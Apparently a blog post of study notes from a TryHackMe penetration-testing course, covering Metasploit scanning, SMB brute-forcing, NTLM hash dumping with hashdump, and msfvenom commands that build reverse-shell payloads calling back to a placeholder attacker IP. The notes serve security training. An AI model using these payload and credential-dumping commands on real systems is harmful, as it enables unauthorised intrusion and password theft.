@@ -1,0 +1,72 @@
+---
+title: 'TryHackMe: Jr. Penetration Tester'
+date: 2022-04-14 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-04-14-tryhackme-jr-penetration-tester.html
+author: 100007
+---
+
+<h1 id="tryhackme-jr-penetration-tester">TryHackMe: Jr. Penetration Tester</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-04-14</p>
+<h2 id="exploitation-with-metasploit">Exploitation with Metasploit</h2>
+<h3 id="scanning">Scanning</h3>
+<p>Use <code class="language-plaintext highlighter-rouge">search portscan</code> to display built-in Metasploit port scanners. Note that <code class="language-plaintext highlighter-rouge">msfconsole</code> needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.</p>
+<p>Speaking of which, Nmap can also be called internally (like other shell commands).</p>
+<p>The <code class="language-plaintext highlighter-rouge">auxiliary/scanner/discovery/udp_sweep</code> module will probe for common UDP services.</p>
+<p>Metasploit has a variety of Samba/CIFS scanners too; use <code class="language-plaintext highlighter-rouge">search scanner/smb</code> to list them.</p>
+<p>NetBIOS = Network Basic Input/Output System</p>
+<p>TryHackMe emphasizes the importance of examining the usage of NetBIOS for potential vulnerabilities, though it’s a bit light on specifics about what this means in practice.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">show advanced</code> to show additional module options.</p>
+<p>The <code class="language-plaintext highlighter-rouge">auxiliary/scanner/http/http_version</code> module will give you HTTP server version information.</p>
+<p>The <code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_login</code> module will allow you to bruteforce Samba logins (username and/or password) using a wordlist(s).</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/nmap.html">Using “nmap”</a></li>
+<li><a href="https://cardboard-iguana.com/notes/samba.html">SAMBA (a.k.a. CIFS) Protocol</a></li>
+<li><a href="https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/portscan/syn">TCP SYN Port Scanner - Metasploit</a></li>
+</ul>
+<h3 id="the-metasploit-database">The Metasploit Database</h3>
+<p>Get basic database status using <code class="language-plaintext highlighter-rouge">db_status</code>.</p>
+<p>Create and delete workspaces (engagements) with <code class="language-plaintext highlighter-rouge">workspace</code>; use <code class="language-plaintext highlighter-rouge">-a</code> to add and <code class="language-plaintext highlighter-rouge">-d</code> to delete. Switch between workspaces using <code class="language-plaintext highlighter-rouge">workspace $NAME</code>.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">db_nmap</code> to run Nmap (all of the regular options work) and dump the results into the Metasploit database.</p>
+<p>The <code class="language-plaintext highlighter-rouge">hosts</code> and <code class="language-plaintext highlighter-rouge">services</code> commands can then be used to display the, well, hosts and services logged by Metasploit during an engagement. Both commands support an <code class="language-plaintext highlighter-rouge">-S</code> search parameter, the results of which can then be added to <code class="language-plaintext highlighter-rouge">RHOSTS</code> using the <code class="language-plaintext highlighter-rouge">-R</code> parameter.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Show the payloads available for a particular exploit using <code class="language-plaintext highlighter-rouge">show payloads</code>. Use <code class="language-plaintext highlighter-rouge">set payload</code> to set the payload for the exploit; re-run <code class="language-plaintext highlighter-rouge">show options</code> after this to check if the payload has added any additional options that will need to be set before exploitation.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">sessions</code> to, well, manage your sessions (most useful when you’ve backgrounded a payload and/or are working with multiple targets).</p>
+<p>To dump NTLM hashes from Meterpreter, use the <code class="language-plaintext highlighter-rouge">hashdump</code> command. Normally only the first four fields are relevant:</p>
+<ul>
+<li>Username</li>
+<li>RID (the last four digits of the Windows SID, with leading zeros dropped)</li>
+<li>The user’s LM password hash</li>
+<li>The user’s NTLM password hash</li>
+</ul>
+<p>References:</p>
+<ul>
+<li><a href="https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf">Dumping Windows Password Hashes Using Metasploit</a></li>
+<li><a href="https://cardboard-iguana.com/notes/windows-password-hashes.html">Windows Password Hashes</a></li>
+</ul>
+<h3 id="msfvenom">Msfvenom</h3>
+<p>Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">--list formats</code> to see available encoding formats.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 32-bit Linux ELF Meterpreter payload</span>
+<span class="c">#</span>
+msfvenom <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="nt">-f</span> elf <span class="o">&gt;</span> rev_shell
+<span class="c"># 32-bit Windows executable Meterpreter payload</span>
+<span class="c">#</span>
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="nt">-f</span> exe <span class="o">&gt;</span> rev_shell.exe
+<span class="c"># PHP Meterpreter payload</span>
+<span class="c">#</span>
+msfvenom <span class="nt">-p</span> php/meterpreter_reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="nt">-f</span> raw <span class="o">&gt;</span> rev_shell.php
+<span class="c"># ASP Meterpreter payload</span>
+<span class="c">#</span>
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="nt">-f</span> asp <span class="o">&gt;</span> rev_shell.asp
+<span class="c"># Python Meterpreter payload</span>
+<span class="c">#</span>
+msfvenom <span class="nt">-p</span> cmd/unix/reverse_python <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="nt">-f</span> raw <span class="o">&gt;</span> rev_shell.py
+</code></pre></div></div>
+<p>Use the <code class="language-plaintext highlighter-rouge">exploit/multi/handler</code> module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use <code class="language-plaintext highlighter-rouge">set payload</code> to tell Metasploit <em>what</em> it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.</p>
